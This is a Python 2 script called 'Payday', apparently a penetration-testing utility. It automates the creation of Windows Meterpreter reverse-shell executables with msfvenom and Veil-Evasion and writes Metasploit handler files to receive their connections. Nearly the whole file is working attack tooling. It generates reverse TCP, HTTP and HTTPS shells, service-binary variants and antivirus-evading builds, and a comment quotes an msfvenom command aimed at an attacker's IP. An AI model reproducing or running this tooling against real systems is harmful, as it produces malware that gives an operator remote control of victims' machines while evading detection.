#!/usr/bin/python
# Author : Matt Lorentzen


import os, sys, time, argparse

def banner():
	banner = """
                       _             
 _ __   __ _ _   _  __| | __ _ _   _ 
| '_ \ / _` | | | |/ _` |/ _` | | | |
| |_) | (_| | |_| | (_| | (_| | |_| |
| .__/ \__,_|\__, |\__,_|\__,_|\__, |
|_|          |___/             |___/ 

	"""	
	print redtxt(banner)

def msf_payloads(ip):
	# Payloads Dictionary
	payloads = []
	#appends payloads with nested 4 value list for dynamic parm calling
	payloads.append(["windows/x64/meterpreter/reverse_tcp", 443, "exe", "metrev64.exe"])
	payloads.append(["windows/meterpreter/reverse_tcp",443, "exe", "metrev.exe"])
	payloads.append(["windows/meterpreter/reverse_http",443, "exe", "methttp.exe"])
	payloads.append(["windows/meterpreter/reverse_https",443, "exe", "methttps.exe"])
	payloads.append(["windows/x64/meterpreter/reverse_tcp",443, "exe-service" , "serv64.exe"])
	payloads.append(["windows/meterpreter/reverse_tcp", 443, "exe-service" ,"serv64.exe"])

	#./msfvenom -p windows/meterpreter/reverse_tcp lhost=[Attacker's IP] lport=4444 -f exe -o /tmp/my_payload.exe
	
	for parms in payloads:
		lhost = ip
		payload = parms[0]
		lport = str(parms[1])
		output_type = parms[2]
		ext = parms[3]
		base = "/root/payloads/windows/"
		venom_cmd = "msfvenom.framework -p " + payload + " LHOST=" + ip + " LPORT=" + lport + " -f " + output_type + " -o " + base + ext
		print "[!] Generating : " + bluetxt(payload)
		os.system(venom_cmd)
		print "[!] Generating handler for : " + bluetxt(payload)
		# strip off ext and replace with .rc
	
		handler = ext.split(".")[0] + ".rc"
		handler_file = open(base + "handlers/" + handler , "w")
		handler_file.write("use exploit/multi/handler\n")
		handler_file.write("set payload " + payload +"\n")
		handler_file.write("set LPORT 443\n")
		handler_file.write("set LHOST " + ip + "\n")
		handler_file.write("exploit -j -z\n")
		handler_file.close()
		print "[!] Generated : " + yellowtxt(handler)


def veil_payloads(ip):
	""" Takes local IP address as LHOST parm and builds Veil payloads"""
	veil_script = "/root/tools/pentest/Veil/Veil-Evasion/./Veil-Evasion.py "
	#start empty list to hold
	payloads = []
	#appends payloads with nested 3 value list for dynamic parm calling
	payloads.append(["cs/meterpreter/rev_https", 443, "veil_rev_https"])
	payloads.append(["c/meterpreter/rev_tcp",443,"veil_rev_tcp_met"])
	payloads.append(["c/meterpreter/rev_http_service",443, "veil_rev_http_srv"])


	print "Creating Veil Goodness"
	for parms in payloads:
		lhost = ip
		payload = parms[0]
		lport = str(parms[1])
		output = parms[2]
		command = ("-p " + payload + " -c LHOST=" + lhost + " LPORT=" + lport + " -o " + output)
		os.system(veil_script + command)
		time.sleep(2)

def clean(payload_path):
	""" Cleans out directory """
	# clean out generated payloads
	for file in os.listdir(payload_path):
		file = payload_path + file
		if os.path.isfile(file):
			print "Removing " + bluetxt(file)
			os.remove(file)
	# Cleaning out Veil Payload Directory	
	os.system("/root/tools/pentest/Veil/Veil-Evasion/./Veil-Evasion.py --clean")
	

###############################
### 	Helper Functions	###
###############################

def redtxt(text2colour):
	redstart = "\033[0;31m"
	redend = "\033[0m"
	return redstart + text2colour + redend

def greentxt(text2colour):
	greenstart = "\033[0;32m"
	greenend = "\033[0m"
	return greenstart + text2colour + greenend
	
def yellowtxt(text2colour):
	yellowstart = "\033[0;33m"
	yellowend = "\033[0m"
	return yellowstart + text2colour + yellowend
	
def bluetxt(text2colour):
	bluestart = "\033[0;34m"
	blueend = "\033[0m"
	return bluestart + text2colour + blueend



##############################
##		 Main Function	   ###
##############################




def Main():
	banner()
	parser = argparse.ArgumentParser(description="Payday File Options - Takes the IP Address and then builds meterpreter windows payloads using msfvenom and veil.\nOutputs to '/root/payloads/windows/'")
	parser.add_argument("--veil", action="store_true", help='Generate Veil Payloads')
	parser.add_argument("--msf", action="store_true", help='Generate MSF Payloads')
	parser.add_argument("--clean", action="store_true", help="Cleans out existing files in the output directory")
	parser.add_argument("--ip", help='Specify Local IP Address for reverse connections')

	args = parser.parse_args()
	ip = args.ip
	if args.msf:
		print yellowtxt("Encoding MSF Payloads")
		msf_payloads(ip)
	if args.veil:
		print yellowtxt("Encoding Veil payloads")
		veil_payloads(ip)
	if args.clean:
		payload_paths = ["/root/payloads/windows/","/root/payloads/windows/handlers/"]
		print redtxt("Cleaning out Payload and Handler File directories")
		for payload_path in payload_paths:
			clean(payload_path)


if __name__ == "__main__":
	Main()
